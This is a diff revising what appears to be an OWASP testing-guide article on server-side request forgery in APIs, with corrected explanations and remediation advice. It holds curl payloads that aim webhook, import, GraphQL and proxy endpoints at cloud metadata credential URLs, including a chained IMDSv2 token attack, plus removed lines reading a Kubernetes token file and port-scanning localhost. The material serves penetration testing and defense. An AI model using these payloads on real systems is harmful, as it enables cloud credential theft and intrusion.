@@ -1,4 +1,4 @@
-# Testing API Server-Side Request Forgery
+# API Server-Side Request Forgery
 
 |ID          |
 |------------|
@@ -6,16 +6,16 @@
 
 ## Summary
 
-Server-Side Request Forgery (SSRF) in APIs occurs when the server fetches a URL or network resource specified by client input without validating the destination. APIs are especially exposed because they commonly accept URL parameters for webhooks, callbacks, file imports, PDF generation, link previews, and service-to-service integrations—entry points that traditional web applications rarely expose.
+Server-Side Request Forgery (SSRF) in APIs occurs when the server fetches a URL or network resource specified by client input without validating the destination. APIs are especially exposed because they commonly accept URL parameters for webhooks, callbacks, file imports, PDF generation, link previews, and service-to-service integrations - entry points that traditional web applications rarely expose.
 
 API SSRF differs from web application SSRF in several ways:
 
-- **Asynchronous processing**: Webhook and callback registrations trigger server-side fetches minutes or hours after the initial request, making detection harder and creating blind SSRF scenarios by default.
-- **Service mesh exposure**: APIs running in microservice architectures have direct access to internal service discovery, sidecar proxies, and cloud metadata endpoints.
-- **Structured input**: URL parameters are embedded in JSON or XML request bodies rather than query strings, allowing injection in nested fields that input validation may miss.
-- **Machine-to-machine context**: API consumers are often other services, so requests may carry elevated privileges or service account credentials.
+- Asynchronous processing: webhook and callback registrations trigger server-side fetches minutes or hours after the initial request, making detection harder and creating blind SSRF scenarios by default.
+- Service mesh exposure: APIs running in microservice architectures have direct access to internal service discovery, sidecar proxies, and cloud metadata endpoints.
+- Structured input: URL parameters are embedded in JSON or XML request bodies rather than query strings, allowing injection in nested fields that input validation may miss.
+- Machine-to-machine context: API consumers are often other services, so requests may carry elevated privileges or service account credentials.
 
-For foundational SSRF testing techniques—including basic internal URL access, IP encoding bypasses, URL encoding bypasses, DNS rebinding, open redirect chains, and protocol switching—see [4.7.19 Testing for Server-Side Request Forgery (WSTG-INPV-19)](../07-Injection/19-Server-Side_Request_Forgery.md). This article covers API-specific entry points and testing methodology not addressed there.
+For foundational SSRF testing techniques - including internal URL access, local file fetching, IP encoding bypasses, URL encoding bypasses, attacker-controlled DNS, and common filter bypass - see [Server-Side Request Forgery (WSTG-INJT-19)](../07-Injection/19-Server-Side_Request_Forgery.md). This article covers API-specific entry points and testing methodology not addressed there.
 
 ## Test Objectives
 
@@ -29,7 +29,7 @@ For foundational SSRF testing techniques—including basic internal URL access, 
 
 ### Related Testing
 
-The bypass techniques in [WSTG-INPV-19](../07-Injection/19-Server-Side_Request_Forgery.md) (IP encoding, URL encoding, DNS rebinding, redirect chains, protocol switching) apply to all SSRF vectors including those below. Test each API-specific entry point with those bypass methods after confirming the basic SSRF behavior described here.
+The bypass techniques in [WSTG-INJT-19](../07-Injection/19-Server-Side_Request_Forgery.md) (alternate IP notation, string obfuscation, attacker-controlled DNS, userinfo and fragment tricks, URL encoding, and common filter bypass) apply to all SSRF vectors including those below. Test each API-specific entry point with those bypass methods after confirming the basic SSRF behavior described here.
 
 ### Identify API SSRF Entry Points
 
@@ -56,7 +56,7 @@ curl -s -X POST -H "Content-Type: application/json" \
 
 ### Test Webhook and Callback Registration
 
-Webhook endpoints register a URL that the server fetches later when an event occurs. This creates blind SSRF by design—the response is never returned to the caller.
+Webhook endpoints register a URL that the server fetches later when an event occurs. This creates blind SSRF by design - the response is never returned to the caller.
 
 #### 1. Register Internal URL as Webhook
 
@@ -154,24 +154,38 @@ curl -s -X POST -H "Content-Type: application/json" \
 
 Cloud-hosted APIs can reach instance metadata endpoints to harvest credentials. This is one of the highest-impact API SSRF scenarios.
 
-#### 1. AWS Instance Metadata
+#### 1. AWS Instance Metadata (IMDSv1)
 
 ```bash
-# IMDSv1 (no token required)
 curl -s -X POST -H "Content-Type: application/json" \
   -H "Authorization: Bearer <TOKEN>" \
   -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' \
   https://api.example.com/v1/fetch
-
-# IMDSv2 (requires PUT token — most SSRF payloads cannot perform this,
-# but test if the server's HTTP library follows through)
-curl -s -X POST -H "Content-Type: application/json" \
-  -H "Authorization: Bearer <TOKEN>" \
-  -d '{"url":"http://169.254.169.254/latest/api/token"}' \
-  https://api.example.com/v1/fetch
 ```
 
-#### 2. GCP Metadata
+#### 2. AWS IMDSv2
+
+IMDSv2 requires a two-step process: a PUT request with the `X-aws-ec2-metadata-token-ttl-seconds` header to obtain a token, then a GET with that token. Most SSRF payloads cannot perform PUT with custom headers, which is why IMDSv2 is a significant SSRF mitigation.
+
+If the vulnerable endpoint allows controlling the HTTP method and headers (such as the [proxy endpoint](#1-service-proxy-endpoints) with a `method` field), chain the requests:
+
+```bash
+# Step 1: Use the proxy to PUT for a token
+curl -s -X POST -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <TOKEN>" \
+  -d '{"service":"http://169.254.169.254/latest/api/token","method":"PUT","headers":{"X-aws-ec2-metadata-token-ttl-seconds":"21600"}}' \
+  https://api.example.com/v1/proxy
+
+# Step 2: Use the returned token to GET credentials
+curl -s -X POST -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <TOKEN>" \
+  -d '{"service":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","method":"GET","headers":{"X-aws-ec2-metadata-token":"<TOKEN_FROM_STEP_1>"}}' \
+  https://api.example.com/v1/proxy
+```
+
+If the vulnerable endpoint does not allow method or header control, IMDSv2 blocks the SSRF.
+
+#### 3. GCP Metadata
 
 ```bash
 curl -s -X POST -H "Content-Type: application/json" \
@@ -182,7 +196,7 @@ curl -s -X POST -H "Content-Type: application/json" \
 
 Note: GCP metadata requires the `Metadata-Flavor: Google` header. Test whether the server's HTTP client forwards custom headers or whether the metadata endpoint accepts requests without the header in certain configurations.
 
-#### 3. Azure Metadata
+#### 4. Azure Metadata
 
 ```bash
 curl -s -X POST -H "Content-Type: application/json" \
@@ -191,23 +205,21 @@ curl -s -X POST -H "Content-Type: application/json" \
   https://api.example.com/v1/fetch
 ```
 
-#### 4. Container-Specific Metadata
+Note: Azure IMDS requires the `Metadata: true` request header and rejects requests carrying `X-Forwarded-For`. If the vulnerable endpoint does not forward custom headers, the payload returns HTTP 400. Test with endpoints that allow header injection or that proxy custom headers to the upstream.
 
-In ECS, EKS, and Fargate environments, metadata is available at the container credential endpoint:
+#### 5. Container Credential Endpoints
+
+In AWS ECS and Fargate environments, temporary credentials are available at the container credential endpoint:
 
 ```bash
-# AWS ECS task metadata
+# AWS ECS/Fargate task credential endpoint
 curl -s -X POST -H "Content-Type: application/json" \
   -H "Authorization: Bearer <TOKEN>" \
   -d '{"url":"http://169.254.170.2/v2/credentials/<GUID>"}' \
   https://api.example.com/v1/fetch
-
-# Kubernetes service account token
-curl -s -X POST -H "Content-Type: application/json" \
-  -H "Authorization: Bearer <TOKEN>" \
-  -d '{"url":"file:///var/run/secrets/kubernetes.io/serviceaccount/token"}' \
-  https://api.example.com/v1/fetch
 ```
+
+Note: `169.254.170.2` is the ECS/Fargate container credential endpoint only. EKS uses IRSA (IAM Roles for Service Accounts) or Pod Identity at `169.254.170.23` and the standard IMDS at `169.254.169.254`. For reading local files such as Kubernetes service account tokens (`/var/run/secrets/kubernetes.io/serviceaccount/token`), see the "Fetch a Local File" section in [WSTG-INJT-19](../07-Injection/19-Server-Side_Request_Forgery.md).
 
 ### Test SSRF in File Import Endpoints
 
@@ -269,33 +281,20 @@ Open the generated PDF or examine the preview response for content from the inte
 
 ### Test SSRF in GraphQL Endpoints
 
-GraphQL APIs may accept URL arguments in queries or mutations, and batched queries can amplify SSRF:
+GraphQL APIs may accept URL arguments in queries or mutations:
 
 ```bash
-# Single query with URL argument
 curl -s -X POST -H "Content-Type: application/json" \
   -H "Authorization: Bearer <TOKEN>" \
   -d '{"query":"mutation { importData(url: \"http://169.254.169.254/latest/meta-data/\") { status } }"}' \
   https://api.example.com/graphql
-
-# Batched queries for port scanning via timing
-curl -s -X POST -H "Content-Type: application/json" \
-  -H "Authorization: Bearer <TOKEN>" \
-  -d '[
-    {"query":"mutation { importData(url: \"http://127.0.0.1:80/\") { status } }"},
-    {"query":"mutation { importData(url: \"http://127.0.0.1:443/\") { status } }"},
-    {"query":"mutation { importData(url: \"http://127.0.0.1:8080/\") { status } }"},
-    {"query":"mutation { importData(url: \"http://127.0.0.1:3306/\") { status } }"},
-    {"query":"mutation { importData(url: \"http://127.0.0.1:6379/\") { status } }"}
-  ]' \
-  https://api.example.com/graphql
 ```
 
-Batched queries execute in parallel on many GraphQL servers, making timing-based port scanning faster and more reliable than sequential requests.
+GraphQL query batching can help evade per-request rate limits on SSRF attempts, but it does not improve timing-based port scanning: a batched response returns only after the slowest operation completes, so per-URL timing is lost. For comprehensive GraphQL batching attack testing, see [GraphQL - Batching Attacks (WSTG-APIT-99)](99-GraphQL.md).
 
 ### Detect Blind SSRF via Out-of-Band Channels
 
-Blind SSRF is the default in API webhook and callback patterns—the server-side response is never returned to the caller. Use out-of-band detection:
+Blind SSRF is the default in API webhook and callback patterns - the server-side response is never returned to the caller. Use out-of-band detection:
 
 #### 1. HTTP Callback Detection
 
@@ -318,7 +317,7 @@ curl -s -X POST -H "Content-Type: application/json" \
   https://api.example.com/v1/fetch
 ```
 
-A DNS query for the subdomain confirms the server resolved the hostname, even if the HTTP request was blocked by a firewall. This distinguishes "URL validated but not fetched" from "URL fetched but response blocked."
+A DNS query for the subdomain confirms the server resolved the hostname. However, a DNS hit alone does not confirm a fetch - it is consistent with both resolve-time validation (where the server resolves the hostname and then denies the request) and an actual fetch blocked by an egress firewall. Only an HTTP callback interaction confirms the server completed the fetch.
 
 #### 3. Delayed Callback Detection
 
@@ -338,18 +337,11 @@ curl -s -X POST -H "Content-Type: application/json" \
   https://api.example.com/v1/invoices/INV-001/pay
 ```
 
-### Test SSRF in OAuth and SAML Integration
+### Test SSRF in Identity Provider Integration
 
-API endpoints that integrate with identity providers may accept URLs that the server fetches during authentication flows:
+API endpoints that integrate with identity providers may accept URLs that the server fetches during authentication configuration:
 
 ```bash
-# OAuth: manipulate redirect_uri to internal address
-curl -s "https://api.example.com/oauth/authorize?\
-client_id=<CLIENT>&\
-redirect_uri=http://127.0.0.1:8080/capture&\
-response_type=code&\
-scope=read"
-
 # OpenID Connect: manipulate discovery URL
 curl -s -X POST -H "Content-Type: application/json" \
   -H "Authorization: Bearer <TOKEN>" \
@@ -363,6 +355,13 @@ curl -s -X POST -H "Content-Type: application/json" \
   https://api.example.com/v1/saml/configure
 ```
 
+The server fetches the OIDC discovery document or SAML metadata XML from the attacker-supplied URL. Insecure behavior: the server returns or processes content from the internal address.
+
+## Related Test Cases
+
+- [Server-Side Request Forgery (WSTG-INJT-19)](../07-Injection/19-Server-Side_Request_Forgery.md)
+- [GraphQL (WSTG-APIT-99)](99-GraphQL.md)
+
 ## Remediation
 
 - Validate and sanitize all user-supplied URLs server-side before fetching. Use an allowlist of permitted schemes (`https` only when possible), hostnames, and ports.
@@ -373,12 +372,12 @@ curl -s -X POST -H "Content-Type: application/json" \
 - Run URL-fetching services in a network segment with no access to internal services or metadata endpoints.
 - For cloud deployments, enforce IMDSv2 (which requires a PUT-based token request that most SSRF payloads cannot perform) and restrict metadata endpoint access to specific containers.
 - Limit GraphQL query batching and apply rate limiting to mutations that accept URL parameters.
-- For comprehensive bypass prevention techniques, see [WSTG-INPV-19](../07-Injection/19-Server-Side_Request_Forgery.md) and the [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
+- For comprehensive bypass prevention techniques, see [WSTG-INJT-19](../07-Injection/19-Server-Side_Request_Forgery.md) and the [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
 
 ## References
 
-- [OWASP Testing Guide — Testing for SSRF (WSTG-INPV-19)](../07-Injection/19-Server-Side_Request_Forgery.md)
-- [OWASP API Security Top 10 — API7:2023 Server-Side Request Forgery](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)
+- [Server-Side Request Forgery - WSTG-INJT-19](../07-Injection/19-Server-Side_Request_Forgery.md)
+- [OWASP API Security Top 10 - API7:2023 Server-Side Request Forgery](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)
 - [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
 - [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
 - [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
